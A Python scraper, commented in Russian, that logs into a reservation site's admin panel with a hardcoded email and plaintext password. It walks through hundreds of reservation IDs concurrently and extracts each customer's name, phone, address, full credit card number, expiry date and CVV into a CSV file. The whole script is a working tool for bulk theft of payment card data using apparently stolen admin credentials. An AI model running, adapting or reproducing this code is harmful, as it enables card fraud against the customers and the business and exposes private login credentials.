import aiohttp
import asyncio
from bs4 import BeautifulSoup
import csv

# URL для авторизации и просмотра бронирований
AUTH_URL = "https://www.onadventure.ca/reservations/admin/reservations.php"
VIEW_URL_TEMPLATE = "https://www.onadventure.ca/reservations/admin/view_reservation.php?rid={rid}"
LOGIN_URL = "https://www.onadventure.ca/reservations/admin/reservations.php?aliEmail=trudy@squarepondpark.ca&aliPass=MooseOwl17"

# Диапазон RID
RID_START = 16400
RID_END = 16700
CSV_FILE = "reservations_data.csv"

# Количество одновременных запросов
CONCURRENT_REQUESTS = 100


async def fetch_data(session: aiohttp.ClientSession, rid: int):
    """Получение данных бронирования и клиента по RID."""
    url = VIEW_URL_TEMPLATE.format(rid=rid)
    try:
        async with session.get(url) as response:
            if response.status == 200:
                html = await response.text()
                return parse_data(html, rid)
            elif response.status == 404:
                print(f"RID {rid}: страница не найдена.")
            else:
                print(f"RID {rid}: ошибка {response.status}.")
    except Exception as e:
        print(f"RID {rid}: ошибка запроса ({e}).")
    return None


def parse_data(html: str, rid: int):
    """Парсим HTML и извлекаем данные о клиенте и кредитной карте."""
    soup = BeautifulSoup(html, "html.parser")

    try:
        # Извлечение информации о клиенте
        customer_section = soup.find('div', id='customerInfoBox')
        name = customer_section.find('h2').text.strip() if customer_section and customer_section.find('h2') else "N/A"
        phone = (
            customer_section.find_all('p')[0].text.strip()
            if customer_section and len(customer_section.find_all('p')) > 0
            else "N/A"
        )
        address = (
            customer_section.find_all('p')[1].text.strip()
            if customer_section and len(customer_section.find_all('p')) > 1
            else "N/A"
        )

        # Извлечение информации о кредите
        credit_card_section = soup.find('div', class_='creditCard')
        credit_card = "N/A"
        expiration_date = "N/A"
        cvv = "N/A"
        
        if credit_card_section:
            credit_card = credit_card_section.find('h3').text.strip()  # Номер карты из тега <h3>
            
            # Извлечение срока действия (первый <p> после номера карты)
            expiration_date_tag = credit_card_section.find_all('p')[0] if len(credit_card_section.find_all('p')) > 0 else None
            if expiration_date_tag:
                expiration_date = expiration_date_tag.text.strip()

            # Извлечение CVV (второй <p> после срока действия)
            cvv_tag = credit_card_section.find_all('p')[1] if len(credit_card_section.find_all('p')) > 1 else None
            if cvv_tag:
                cvv = cvv_tag.text.strip()

        return {
            "rid": rid,
            "name": name,
            "phone": phone,
            "address": address,
            "credit_card": credit_card,
            "expiration_date": expiration_date,
            "cvv": cvv,
        }
    except Exception as e:
        # Логируем ошибку и HTML
        print(f"RID {rid}: ошибка при парсинге ({e}).")
        with open(f"errors/rid_{rid}_error.html", "w", encoding="utf-8") as error_file:
            error_file.write(html)
        return None


async def save_to_csv(data_list):
    """Сохраняем данные в CSV."""
    if not data_list:
        print("Нет данных для сохранения.")
        return

    keys = data_list[0].keys()
    with open(CSV_FILE, mode='w', newline='', encoding='utf-8') as file:
        writer = csv.DictWriter(file, fieldnames=keys)
        writer.writeheader()
        writer.writerows(data_list)
    print(f"Данные успешно сохранены в {CSV_FILE}")


async def process_rids(rid_range, session):
    """Обрабатываем диапазон RID."""
    tasks = [fetch_data(session, rid) for rid in rid_range]
    results = await asyncio.gather(*tasks)
    return [result for result in results if result]  # Убираем None


async def main():
    """Основной процесс."""
    async with aiohttp.ClientSession() as session:
        # Выполняем авторизацию
        async with session.get(LOGIN_URL) as login_response:
            if login_response.status != 200:
                print("Ошибка авторизации. Проверьте URL или данные входа.")
                return
            print("Авторизация успешна!")

        # Обработка диапазона RID
        all_rid_data = []
        rid_range = range(RID_START, RID_END + 1)
        rid_chunks = [rid_range[i:i + CONCURRENT_REQUESTS] for i in range(0, len(rid_range), CONCURRENT_REQUESTS)]

        for chunk in rid_chunks:
            print(f"Обработка RID {chunk.start} - {chunk.stop - 1}")
            data = await process_rids(chunk, session)
            all_rid_data.extend(data)

        # Сохранение данных
        await save_to_csv(all_rid_data)


if __name__ == "__main__":
    asyncio.run(main())